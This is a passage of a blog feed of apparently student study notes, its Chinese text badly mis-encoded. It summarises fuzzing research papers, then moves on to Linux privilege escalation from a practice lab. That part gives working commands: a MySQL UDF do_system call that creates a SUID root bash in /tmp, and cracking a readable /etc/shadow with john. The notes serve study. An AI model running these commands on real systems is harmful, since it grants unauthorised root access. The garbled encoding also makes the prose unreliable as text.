‘ä¸­æ¯ä¸ªç§å­çš„æ¨¡ç³Šå¾—åˆ†æ±‡æ€»ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå˜ä½“æ˜¯æŒ‡å¯¹åº”ç§å­çš„æ¨¡ç³Šåº¦è¯„åˆ†ã€‚</p><h2 id="Not-All-Coverage-Measurements-Are-Equal-Fuzzing-by-Coverage-Accounting-for-Input-Prioritization"><a href="#Not-All-Coverage-Measurements-Are-Equal-Fuzzing-by-Coverage-Accounting-for-Input-Prioritization" class="headerlink" title="Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization"></a>Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization</h2><h3 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h3><blockquote><p>è®ºæ–‡ä¸­æåˆ°çš„ï¼Œä»¥åŠæˆ‘ä¸ªäººéœ€è¦è¯»æ‡‚è¿™ç¯‡è®ºæ–‡ï¼Œéœ€è¦è¿›è¡Œè¡¥å……çš„èƒŒæ™¯çŸ¥è¯†</p></blockquote><h4 id="taint-analysis"><a href="#taint-analysis" class="headerlink" title="taint analysis"></a>taint analysis</h4><p>æ±¡ç‚¹åˆ†æå¯ä»¥æŠ½è±¡æˆä¸€ä¸ªä¸‰å…ƒç»„&lt;sources, sinks, sanitizers&gt;çš„å½¢å¼ã€‚sourcesï¼šæ±¡ç‚¹æºï¼Œä»£è¡¨ç›´æ¥å¼•å…¥ä¸å—ä¿¡ä»»çš„æ•°æ®æˆ–è€…æœºå¯†æ•°æ®åˆ°ç³»ç»Ÿä¸­ã€‚sinkï¼šæ±¡ç‚¹æ±‡èšç‚¹ï¼Œä»£è¡¨ç›´æ¥äº§ç”Ÿå®‰å…¨æ•æ„Ÿæ“ä½œæˆ–è€…æ³„éœ²éšç§æ•°æ®åˆ°å¤–ç•Œã€‚sanitizerï¼šæ— å®³å¤„ç†ï¼Œä»£è¡¨é€šè¿‡æ•°æ®åŠ å¯†æˆ–è€…ç§»é™¤å±å®³æ“ä½œç­‰æ‰‹æ®µä½¿æ•°æ®ä¼ æ’­ä¸å†å¯¹è½¯ä»¶ç³»ç»Ÿçš„ä¿¡æ¯å®‰å…¨äº§ç”Ÿå±å®³ã€‚</p><p>æ±¡ç‚¹åˆ†æå°±æ˜¯åˆ†æç¨‹åºä¸­ç”±æ±¡ç‚¹æºå¼•å…¥çš„æ•°æ®æ˜¯å¦èƒ½å¤Ÿä¸ç»æ— å®³å¤„ç†,è€Œç›´æ¥ä¼ æ’­åˆ°æ±¡ç‚¹æ±‡èšç‚¹.å¦‚æœä¸èƒ½,è¯´æ˜ç³»ç»Ÿæ˜¯ä¿¡æ¯æµå®‰å…¨çš„;å¦åˆ™,è¯´æ˜ç³»ç»Ÿäº§ç”Ÿäº†éšç§æ•°æ®æ³„éœ²æˆ–å±é™©æ•°æ®æ“ä½œç­‰å®‰å…¨é—®é¢˜ã€‚</p><p>æ±¡ç‚¹åˆ†æçš„å¤„ç†è¿‡ç¨‹å¯ä»¥åˆ†æˆ 3 ä¸ªé˜¶æ®µ: (1) è¯†åˆ«æ±¡ç‚¹æºå’Œæ±‡èšç‚¹; (2) æ±¡ç‚¹ä¼ æ’­åˆ†æ; (3) æ— å®³å¤„ç†.</p><h4 id="ç¬¦å·æ‰§è¡Œ"><a href="#ç¬¦å·æ‰§è¡Œ" class="headerlink" title="ç¬¦å·æ‰§è¡Œ"></a>ç¬¦å·æ‰§è¡Œ</h4><ul><li><a href="https://www.jianshu.com/p/2ba973c4b0cc/">å‚è€ƒ</a></li><li><a href="https://www.baidu.com/s?wd=SymQEMU:Compilation-based%20symbolic%20execution%20for%20binaries">å‚è€ƒè®ºæ–‡â€“SymQEMU:Compilation-based symbolic execution for binaries</a><br>ç¬¦å·æ‰§è¡Œ ï¼ˆSymbolic Executionï¼‰æ˜¯ä¸€ç§ç¨‹åºåˆ†ææŠ€æœ¯ï¼Œå®ƒå¯ä»¥é€šè¿‡åˆ†æç¨‹åºæ¥å¾—åˆ°è®©ç‰¹å®šä»£ç åŒºåŸŸæ‰§è¡Œçš„è¾“å…¥ã€‚é¡¾åæ€ä¹‰ï¼Œä½¿ç”¨ç¬¦å·æ‰§è¡Œåˆ†æä¸€ä¸ªç¨‹åºæ—¶ï¼Œè¯¥ç¨‹åºä¼šä½¿ç”¨ç¬¦å·å€¼ä½œä¸ºè¾“å…¥ï¼Œè€Œéä¸€èˆ¬æ‰§è¡Œç¨‹åºæ—¶ä½¿ç”¨çš„å…·ä½“å€¼ã€‚åœ¨è¾¾åˆ°ç›®æ ‡ä»£ç æ—¶ï¼Œåˆ†æå™¨å¯ä»¥å¾—åˆ°ç›¸åº”çš„è·¯å¾„çº¦æŸï¼Œç„¶åé€šè¿‡çº¦æŸæ±‚è§£å™¨æ¥å¾—åˆ°å¯ä»¥è§¦å‘ç›®æ ‡ä»£ç çš„å…·ä½“å€¼ã€‚<br>åœ¨ç†æƒ³æ¨¡å‹ä¸­ï¼Œç¨‹åºä½¿ç”¨çš„æ¯ä¸ªç¬¦å·å˜é‡å‡åº”è¯¥æ˜¯ä¸€ä¸ªæœ‰ç¬¦å·æ•´æ•°ã€‚</li></ul><p>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯è¿‘å¹´æ¥å¤§åŠ›å‘å±•ï¼Œä¸€ç§æœ‰æ•ˆä½†æ˜¯ä»£ä»·å¤§çš„æŠ€æœ¯ï¼Œå…¶ç»å¸¸ä¸fuzzingæŠ€æœ¯æ··åˆï¼Œå¹¶æˆä¸ºæ··åˆfuzzingï¼Œfuzzingç”¨æ¥æ¢ç´¢å®¹æ˜“åˆ°è¾¾çš„è·¯å¾„ï¼Œè€Œç¬¦å·æ‰§è¡Œç”¨æ¥æ¢ç´¢ä¸æ˜“åˆ°è¾¾çš„è·¯å¾„ã€‚</p><p>é’ˆå¯¹ç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„é‡è¦ç‰¹å¾ä¹‹ä¸€å°±æ˜¯å…¶æ˜¯å¦éœ€è¦æä¾›æºä»£ç è¿›è¡Œåˆ†æï¼Œè€ŒçœŸå®ä¸–ç•Œä¸­çš„å¤§å¤šæ•°ç¨‹åº(ç”±äºæŸäº›åŸå› )æ˜¯ä¸æä¾›æºä»£ç çš„ã€‚</p><h4 id="ç™½ç›’æµ‹è¯•ï¼ˆstructureï¼‰"><a href="#ç™½ç›’æµ‹è¯•ï¼ˆstructureï¼‰" class="headerlink" title="ç™½ç›’æµ‹è¯•ï¼ˆstructureï¼‰"></a>ç™½ç›’æµ‹è¯•ï¼ˆstructureï¼‰</h4><p>ä¸»è¦ä¸“æ³¨äºæµ‹è¯•ç³»ç»Ÿå†…éƒ¨çš„ç»“æ„ï¼Œå› æ­¤éœ€è¦å°½å¯èƒ½çš„åœ¨æµ‹è¯•ä¸­è¦†ç›–åˆ°æ‰€æœ‰å¿…è¦çš„è¦ç´ ã€‚</p><ul><li>statement coverage&#x2F;node coverage: test caseè¦ç¡®ä¿å°½å¯èƒ½è¦†ç›–åˆ°æ‰€æœ‰çš„nodeï¼ˆæ¯ä¸€ä¸ªæ“ä½œåœ¨æ§åˆ¶æµç¨‹å›¾(CFG)ä¸­å°±æ˜¯ä¸€ä¸ªåœ†è§’æ–¹æ¡†å³nodeï¼‰</li><li>decision coverage&#x2F;edge coverage: test caseè¦ç¡®ä¿å°½å¯èƒ½è¦†ç›–åˆ°æ‰€æœ‰çš„edgeï¼Œï¼ˆå³æ‰€æœ‰çš„ç®­å¤´ï¼‰</li><li>condition coverage: è¿™æ˜¯é’ˆå¯¹ä»£ç ä¸­æµ‹è¯•çš„æ¡ä»¶è¯­å¥ï¼Œæ¯ä¸ªæ¡ä»¶è¦å°½é‡coveråˆ°å…¶æ‰€æœ‰æ­£ç¡®æˆ–é”™è¯¯çš„ç»“æœï¼Œä¸»è¦æœ‰ä¸¤ç§å†™test caseçš„æ–¹æ³•<ul><li>simple: é’ˆå¯¹æ¡ä»¶è¯­å¥ä¸­æ‰€æœ‰çš„æ¡ä»¶ï¼Œæ¯ä¸ªæ¡ä»¶éƒ½éœ€è¦è‡³å°‘æœ‰ä¸€ä¸ªTå’Œä¸€ä¸ªFçš„æƒ…å†µåŒ…æ‹¬åœ¨å†…ï¼ˆè¿™ä¸ªæƒ…å†µç§°ä¸ºæ»¡è¶³simple condition coverageï¼‰ï¼Œä½†æ˜¯ä»…ä»…æ˜¯é’ˆå¯¹ä¸€ä¸ªè¯­å¥é‡Œçš„å­æ¡ä»¶ï¼Œæ•´ä¸ªæ¡ä»¶è¯­å¥çš„ç»“æœå¯èƒ½ä¸ä¼šæ»¡è¶³ä¸€å®šæœ‰Tå’ŒFï¼ˆè¿™ç§æƒ…å†µä¸ºæ»¡è¶³condition coverageï¼‰ã€‚</li><li>multiple: è¿™ç§æ–¹æ³•å°±æ˜¯ä¸ä»…è¦æ»¡è¶³æ¯ä¸ªå­æ¡ä»¶æœ‰Tæœ‰Fè¿˜è¦å°†æ‰€æœ‰å¯èƒ½çš„å­æ¡ä»¶çš„ç»„åˆæƒ…å†µç»™åˆ—å‡ºæ¥</li></ul></li><li>path coverage: åœ¨test caseä¸­éœ€è¦å°½é‡åŒ…æ‹¬æ‰€æœ‰çš„è·¯å¾„ï¼ˆå³åˆ°æ¯ä¸€ä¸ªå¯èƒ½ç»ˆç‚¹çš„å¯èƒ½è·¯å¾„ï¼‰ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯å¦‚æœæ²¡æœ‰å¾ªç¯æ‰å¯èƒ½coveråˆ°æ‰€æœ‰çš„æƒ…å†µï¼Œå³ä½¿åªæœ‰ä¸€ä¸ªå¾ªç¯ä¹Ÿæ— æ³•coveråˆ°æ‰€æœ‰çš„æƒ…å†µ</li><li>loop coverage: å…¶å®ç®—æ˜¯path coverageçš„ä¸€éƒ¨åˆ†ï¼Œå…¶æ—¨åœ¨æµ‹è¯•ä»£ç ä¸­çš„å¾ªç¯ã€‚</li></ul><h4 id="anti-fuzzing-techniques"><a href="#anti-fuzzing-techniques" class="headerlink" title="anti-fuzzing techniques"></a>anti-fuzzing techniques</h4><p>åæ¨¡ç³ŠåŒ–æŠ€æœ¯é€šè¿‡æ’å…¥ä¼ªè·¯å¾„ã€åœ¨é”™è¯¯å¤„ç†ä»£ç ä¸­æ·»åŠ å»¶è¿Ÿã€æ¨¡ç³Šä»£ç ä»¥å‡ç¼“åŠ¨æ€åˆ†ææ¥æ¬ºéª—æ¨¡ç³Šæµ‹è¯•ã€‚</p><h4 id="CGF-Coverage-guided-Fuzzing"><a href="#CGF-Coverage-guided-Fuzzing" class="headerlink" title="CGF(Coverage-guided Fuzzing)"></a>CGF(Coverage-guided Fuzzing)</h4><p>fuzzingæ˜¯ä¸€ç§è‡ªåŠ¨ç”Ÿæˆå’Œæµ‹è¯•è¾“å…¥ä»¥å‘ç°è½¯ä»¶æ¼æ´çš„ç¨‹åºæµ‹è¯•æŠ€æœ¯ã€‚å®ƒä¸éœ€è¦å¯¹ç¨‹åºçš„ç†è§£ï¼Œä¹Ÿä¸éœ€è¦äººå·¥ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ï¼Œå…·æœ‰çµæ´»æ€§ï¼Œå®¹æ˜“é€‚ç”¨äºä¸åŒçš„ç¨‹åºã€‚</p><p>è¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•ä»¥ä¸€ä¸ªåˆå§‹è¾“å…¥(ç§å­)å’Œä¸€ä¸ªç›®æ ‡ç¨‹åºä½œä¸ºè¾“å…¥ï¼Œäº§ç”Ÿè§¦å‘ç¨‹åºé”™è¯¯çš„è¾“å…¥ä½œä¸ºè¾“å‡ºã€‚å®ƒé‡å¤é€‰æ‹©ä¸€ä¸ªè¾“å…¥ï¼Œç”¨è¾“å…¥è¿è¡Œç›®æ ‡ç¨‹åºï¼Œå¹¶æ ¹æ®å½“å‰è¾“å…¥åŠå…¶è¿è¡Œç»“æœç”Ÿæˆæ–°çš„è¾“å…¥ã€‚</p><h3 id="æ–‡ç« è´¡çŒ®"><a href="#æ–‡ç« è´¡çŒ®" class="headerlink" title="æ–‡ç« è´¡çŒ®"></a>æ–‡ç« è´¡çŒ®</h3><ul><li>æå‡ºäº†coverage accountingï¼Œè¾“å…¥ä¼˜åŒ–çš„æ–°æ–¹æ³•</li><li>å¼€å‘äº†TortoiseFuzzï¼ŒåŸºäºcoverage accountingçš„ç°ç›’fuzzer</li></ul><h3 id="coverage-accounting"><a href="#coverage-accounting" class="headerlink" title="coverage accounting"></a>coverage accounting</h3><p>å¯¹edgesåº¦é‡ï¼Œè¿›è¡Œè¾“å…¥ä¼˜åŒ–ï¼Œé€šè¿‡å¯¹è¾“å…¥è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Œç¼©çŸ­å‘ç°æ¼æ´çš„æ—¶é—´ï¼›ä¸ºäº†æŠµå¾¡anti-fuzzingï¼Œä¸ä¾èµ–äºæ±¡ç‚¹åˆ†ææˆ–è€…ç¬¦å·æ‰§è¡Œã€‚</p><p>ä»å‡½æ•°è°ƒç”¨ï¼Œå¾ªç¯å’ŒåŸºæœ¬å—ä¸‰ä¸ªç²’åº¦åˆ†åˆ«å¯¹edgeè¿›è¡Œåº¦é‡ã€‚</p><ul><li>å‡½æ•°è°ƒç”¨ï¼šä»CVEä»¥åŠå…¶å­é¡µé¢ä¸­çˆ¬å–æ•°æ®ï¼Œæ€»ç»“å‡ºä¸€äº›æ˜“äºå‡ºç°é—®é¢˜çš„åº“å‡½æ•°çš„æ•°æ®è¡¨ã€‚æ ¹æ®è¿™äº›æ•°æ®è¡¨ï¼Œè®¡ç®—ä¸€ä¸ªedgeç›®çš„åŸºæœ¬å—ä¸­è°ƒç”¨è¿™äº›æ˜“äºå‡ºç°é—®é¢˜çš„åº“å‡½æ•°çš„å‡½æ•°ä¸ªæ•°</li><li>å¾ªç¯ï¼šè‹¥eæ˜¯back edgeï¼ˆå›è¾¹ï¼Œå…¶å¤´æ˜¯å…¶å°¾çš„å¿…ç»ç»“ç‚¹ï¼‰ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0</li><li>åŸºæœ¬å—ï¼šç›®çš„åŸºæœ¬å—ä¸­åŒ…å«å†…å­˜æ“ä½œçš„æŒ‡ä»¤ä¸ªæ•°</li></ul><h3 id="TORTOISEFUZZçš„è®¾è®¡"><a href="#TORTOISEFUZZçš„è®¾è®¡" class="headerlink" title="TORTOISEFUZZçš„è®¾è®¡"></a>TORTOISEFUZZçš„è®¾è®¡</h3><p>fuzzerçš„è®¾è®¡ç›®çš„æ˜¯ç»“åˆcoverage accountingï¼Œå¯¹æ›´å®¹æ˜“å¯¼è‡´è„†å¼±ä»£ç çš„è¾“å…¥è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼ŒåŒæ—¶ä¿è¯ä¼˜å…ˆè¾“å…¥è¦†ç›–è¶³å¤Ÿçš„ä»£ç </p><ul><li>ç”±äºå†…å­˜æ“ä½œæ˜¯å†…å­˜é”™è¯¯çš„å…ˆå†³æ¡ä»¶ï¼Œæ‰€ä»¥åªæœ‰å®‰å…¨æ•æ„Ÿçš„edgesæ‰æ˜¯æ¼æ´çš„å…³é”®ï¼Œå› æ­¤åº”è¯¥è¢«é€‰æ‹©çš„è¾“å…¥å®Œå…¨è¦†ç›–ã€‚</li><li>é€šè¿‡coverage accountingçš„è®¡ç®—ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªåŸŸå€¼ï¼Œå½“è¶…è¿‡åŸŸå€¼æ—¶ï¼Œè®¤ä¸ºæ˜¯å®‰å…¨æ•æ„Ÿçš„</li><li>åœ¨è¾“å…¥çš„é€‰æ‹©ä¸Šï¼Œè¾“å…¥è¶Šæ˜¯å‘½ä¸­å®‰å…¨æ•æ„Ÿçš„edgesï¼Œè¶Šæœ‰å¯èƒ½æ¼”åŒ–ä¸ºè§¦å‘æ¼æ´</li></ul><h2 id="å¯ç–‘åŸºæœ¬å—å¯¼å‘çš„å®šå‘æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ç ”ç©¶"><a href="#å¯ç–‘åŸºæœ¬å—å¯¼å‘çš„å®šå‘æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ç ”ç©¶" class="headerlink" title="å¯ç–‘åŸºæœ¬å—å¯¼å‘çš„å®šå‘æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ç ”ç©¶"></a>å¯ç–‘åŸºæœ¬å—å¯¼å‘çš„å®šå‘æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ç ”ç©¶</h2><h3 id="æ ¸å¿ƒå†…å®¹"><a href="#æ ¸å¿ƒå†…å®¹" class="headerlink" title="æ ¸å¿ƒå†…å®¹"></a>æ ¸å¿ƒå†…å®¹</h3><ul><li>åˆ©ç”¨é™æ€æ±¡ç‚¹åˆ†æç­›é€‰å‡ºç›®æ ‡ç¨‹åºæ‰€æœ‰å¯ç–‘åŸºæœ¬å—ï¼Œå†é€šè¿‡å‡½æ•°é—´æ§åˆ¶æµåˆ†æå¾—å‡ºåŸºæœ¬å—ä¹‹é—´çš„å¯è¾¾æ€§ï¼Œä»¥æå–å¯åˆ°è¾¾å¯ç–‘åŸºæœ¬å—é›†åˆçš„æ‰€æœ‰åŸºæœ¬å—<ul><li>è¿™ç¯‡æ–‡ç« åˆ†æäº†ä¸‰ç§é—®é¢˜ï¼šç¼“å†²åŒºæº¢å‡ºã€æ•´å½¢æº¢å‡ºã€ç§»ä½ä½æ•°è¿‡å¤§çš„ç‰¹å¾ï¼Œä½¿ç”¨æ±¡ç‚¹åˆ†ææ–¹æ³•æ‰¾åˆ°è¿™äº›ç‰¹å¾æ‰€åœ¨çš„ä»£ç å—ã€‚</li></ul></li><li>å°†å¯ç–‘åŸºæœ¬å—ä»¥åŠå¯ä»¥åˆ°è¾¾è¿™äº›å—çš„å—ä½œä¸ºæ’æ¡©å¯¹è±¡ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ— æ³•åˆ°è¾¾è¯¥å¯ç–‘åŸºæœ¬å—çš„å—åˆ™ä¸æ’æ¡©ï¼Œä»¥æ­¤é™ä½æ¡©ä»£ç å¼•å…¥çš„é¢å¤–å¼€é”€ã€‚</li><li>è®¡ç®—æ‰€æœ‰åŸºæœ¬å—åˆ°å¯ç–‘åŸºæœ¬å—é›†åˆçš„è·ç¦»ï¼Œæ ¹æ®è¯¥è·ç¦»èµ‹äºˆåŸºæœ¬å—æƒé‡ï¼Œè·ç¦»è¶Šå°æƒé‡è¶Šå¤§</li><li>æ ¹æ®ç§å­æ‰€è§¦å‘è·¯å¾„ä¸Šå„åŸºæœ¬å—çš„æƒé‡è®¡ç®—å…¶å˜å¼‚åæ¼æ´å‘ç°æ¦‚ç‡ï¼Œå˜å¼‚æ—¶ä¼˜å…ˆé€‰æ‹©æ¼æ´å‘ç°æ¦‚ç‡æ›´é«˜çš„ç§å­ï¼Œå€Ÿæ­¤ä¼˜åŒ–ç§å­é€‰æ‹©è¿‡ç¨‹ï¼Œæé«˜æ¨¡ç³Šæµ‹è¯•æ¼æ´æŒ–æ˜æ•ˆç‡ã€‚</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided&quot;&gt;&lt;a href=&quot;#Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided&quot; class=&quot;headerlink&quot; title=&quot;Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided&quot;&gt;&lt;/a&gt;Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided&lt;/h2&gt;&lt;h3 id=&quot;abstract&quot;&gt;&lt;a href=&quot;#abstract&quot; class=&quot;headerlink&quot; title=&quot;abstract&quot;&gt;&lt;/a&gt;abstract&lt;/h3&gt;&lt;p&gt;åœ¨æœ¬ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬å‘ç°ç§å­ä¹‹é—´çš„å…³ç³»å¯¹äºç§å­è°ƒåº¦æ˜¯æœ‰ä»·å€¼çš„ã€‚æˆ‘ä»¬é€šè¿‡ç ”ç©¶å’Œåˆ©ç”¨ç§å­ä¹‹é—´çš„å˜å¼‚å…³ç³»ï¼Œè®¾è®¡å¹¶æå‡ºäº†ä¸€ä¸ªâ€ç§å­å˜å¼‚æ ‘â€ã€‚åˆ©ç”¨â€ç§å­å˜å¼‚æ ‘â€ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥å°†ç§å­è°ƒåº¦é—®é¢˜å»ºæ¨¡ä¸ºè’™ç‰¹å¡æ´›æ ‘æœç´¢( MCTS )é—®é¢˜ã€‚å³åœ¨MCTSä¼°è®¡çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡æœ€ä¼˜è·¯å¾„éå†â€ç§å­å˜å¼‚æ ‘â€ï¼Œé€‰æ‹©ä¸‹ä¸€ä¸ªç§å­è¿›è¡Œæ¨¡ç³Šå¤„ç†ã€‚&lt;/p&gt;
&lt;h3 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#introduction&quot; class=&quot;headerlink&quot; title=&quot;introduction&quot;&gt;&lt;/a&gt;introduction&lt;/h3&gt;&lt;p&gt;å¤§é‡çš„ç§å­è°ƒåº¦ç­–ç•¥è¢«æå‡ºã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™äº›ç­–ç•¥çš„ç›®çš„æ˜¯æ ¹æ®ä¸€å®šçš„æ ‡å‡†ä¸ºæ¯ä¸ªç§å­åˆ†é…ä¸€ä¸ªåˆ†æ•°ï¼Œç„¶åé€‰æ‹©åˆ†æ•°æœ€é«˜çš„ç§å­è¿›è¡Œä¸‹ä¸€æ¬¡çš„æ¨¡ç³Šè¿­ä»£ã€‚ä¾‹å¦‚ï¼ŒAFLåå¥½äºå…·æœ‰æœ€å°å°ºå¯¸å’Œæœ€çŸ­æ‰§è¡Œæ—¶é—´çš„ç§å­ã€‚è¿™äº›ç­–ç•¥ç‹¬ç«‹åœ°å¯¹å¾…è¿™äº›ç§å­ï¼Œå¹¶æ²¡æœ‰æ˜ç¡®åœ°è€ƒè™‘ç§å­ä¹‹é—´çš„å…³ç³»ã€‚&lt;/p&gt;
&lt;p&gt;â€œç§å­å˜å¼‚æ ‘â€çš„ä¸»è¦ä¼˜ç‚¹æ˜¯æœ‰åˆ©äºç§å­è°ƒåº¦åœ¨åˆ©ç”¨å¼(å³,åå¤é”»ç‚¼ä¸€ä¸ªé«˜ç”µä½çš„ç§å­å’Œå®ƒçš„é‚»å±…)å’Œæ¢ç´¢å¼(å³,å°è¯•ä¸€ä¸ªå¾ˆå°‘é”»ç‚¼çš„ç§å­)ä¹‹é—´è¿›è¡Œå¹³è¡¡ï¼Œä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚å¦‚ä¸Šæ‰€è¿°ï¼Œç§å­è°ƒåº¦æ˜¯æŒ‡ä¸ºæ¢ç´¢å…¶é‚»å±…è·¯å¾„è€Œé€‰æ‹©ä¸€æ¡æ‰§è¡Œè·¯å¾„ã€‚åˆ©ç”¨ç§å­ä¹‹é—´çš„å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥å°†æ¯ä¸ªç§å­å¯¹åº”çš„è·¯å¾„ç»„ç»‡ä¸ºä¸€ä¸ªæ ‘ç»“æ„ï¼Œè®°ä¸ºæ‰§è¡Œæ ‘ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="æ–‡çŒ®é˜…è¯»" scheme="https://jingtianer.github.io/home/tags/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>DNSç¬¬å››å‘¨è°ƒç ”</title>
    <link href="https://jingtianer.github.io/home/2023/02/02/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%B0%83%E7%A0%94/"/>
    <id>https://jingtianer.github.io/home/2023/02/02/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%B0%83%E7%A0%94/</id>
    <published>2023-02-02T04:15:37.000Z</published>
    <updated>2023-02-12T03:09:54.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸»æœºææƒ"><a href="#ä¸»æœºææƒ" class="headerlink" title="ä¸»æœºææƒ"></a>ä¸»æœºææƒ</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/432182767">å‚è€ƒ</a></li><li><a href="https://zhuanlan.zhihu.com/p/304572787">è“æ¡¥æ¯æ•™ç¨‹</a></li><li><a href="https://tryhackme.com/room/linuxprivesc">tryHackme</a>ï¼Œè¿™æ˜¯ä¸€ä¸ªé¶åœºï¼Œæä¾›äº†21ä¸ªä¸»æœºææƒçš„task</li></ul><h3 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h3><ol><li><p>UDFå…¨åuser-defined function capability</p></li><li><p>å®ƒå¯ä»¥é€šè¿‡å¯¹MYSQLä¸­çš„å‡½æ•°è°ƒç”¨è¿æ¥ç³»ç»Ÿä¸Šå¯ç”¨çš„ç³»ç»ŸåŠ¨æ€åº“</p></li></ol><h4 id="UDFæ”»å‡»æ¡ä»¶"><a href="#UDFæ”»å‡»æ¡ä»¶" class="headerlink" title="UDFæ”»å‡»æ¡ä»¶"></a>UDFæ”»å‡»æ¡ä»¶</h4><ol><li>å¿…é¡»è·å¾—MYSQLçš„è´¦å·æœ€å¥½æ˜¯rootï¼Œç„¶åå»åˆ°MYSQLé‡Œé¢æ£€æŸ¥æ˜¯å¦æ‹¥æœ‰insertæ’å…¥æƒé™ï¼Œæ£€æŸ¥å‘½ä»¤: <code>select User,Host from user where Insert_priv=&#39;Y&#39;;</code>æ˜¯å¦æœ‰è¾“å‡º</li><li>å¯ä»¥æ›´æ”¹æ•°æ®åº“å½“ç„¶æ‹¿åˆ°rootæœ€å¥½</li><li>å…è®¸æ‹·è´æ–‡ä»¶è¿›æ¥(æ£€æŸ¥å‘½ä»¤: <code>show variables like &#39;local_infile&#39;;</code>ç»“æœä¸ºONæ‰è¡Œ)</li></ol><h4 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h4><ol><li>é¦–å…ˆæ”»è¿›å»å¹¶ä¸”è·å¾—ä¸€ä¸ªMYSQLæ•°æ®åº“è´¦å·ä¸”æƒé™æ¯”è¾ƒé«˜</li><li>ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„åŠ¨æ€åº“æ–‡ä»¶</li><li>åœ¨è¿›å…¥MYSQLä»¥åé€šè¿‡insertå‡½æ•°æŠŠåŠ¨æ€åº“æ–‡ä»¶å­˜å‚¨è¿›æ¥</li><li>æ­å»ºè¿æ¥</li><li>æ‰§è¡Œ</li><li>å¤ç°è¿‡ç¨‹,é¦–å…ˆéœ€è¦å‡†å¤‡å¥½æ–‡ä»¶ï¼Œkaliä¸Šå·²æœ‰(raptor_udf2.so)</li><li>åˆ›å»ºdo_systemå‡½æ•°</li><li>æ‰§è¡Œå‡½æ•° <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> do_system(<span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li>å¯åŠ¨è¿™ä¸ªbash</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure><h3 id="å¯è¯»çš„-x2F-etc-x2F-shadowæ–‡ä»¶"><a href="#å¯è¯»çš„-x2F-etc-x2F-shadowæ–‡ä»¶" class="headerlink" title="å¯è¯»çš„&#x2F;etc&#x2F;shadowæ–‡ä»¶"></a>å¯è¯»çš„&#x2F;etc&#x2F;shadowæ–‡ä»¶</h3><p><code>/etc/shadow</code>å’Œ<code>/etc/passwd</code>ä¸Šé¢éƒ½ä¼šå­˜å‚¨ç€è¿™å°æœºå­ä¸Šçš„ç”¨æˆ·å¯†ç ä¿¡æ¯ã€‚<code>passwd</code>å¯è¯»ä½†ä¸ä¼šæ˜¾ç¤ºå…·ä½“å¯†ç ï¼Œç†è®ºä¸Šæ¥è®²åªæœ‰<code>root</code>æ‰èƒ½æ”¹ã€‚è€Œ<code>shadow</code>æœ‰åŠ å¯†çš„è´¦å·å¯†ç ä¿¡æ¯ä½†æ˜¯ä¸€èˆ¬æ¥è®²æ˜¯ä¸å¯è¯»çš„ã€‚è¿™é‡Œå‡è®¾æˆ‘ä»¬æ‹¥æœ‰å¯¹<code>/etc/shadow</code>çš„è¯»å†™æƒé™ã€‚</p><p>ä¿å­˜æˆæ–‡æœ¬ä¿¡æ¯ï¼Œå¯ç”¨<code>john</code>è¿›è¡Œè§£å¯†ã€‚æœ€åå¾—åˆ°å¯†ç ã€‚</p><h3 id="å¯å†™çš„-x2F-etc-x2F-shadowæ–‡ä»¶"><a 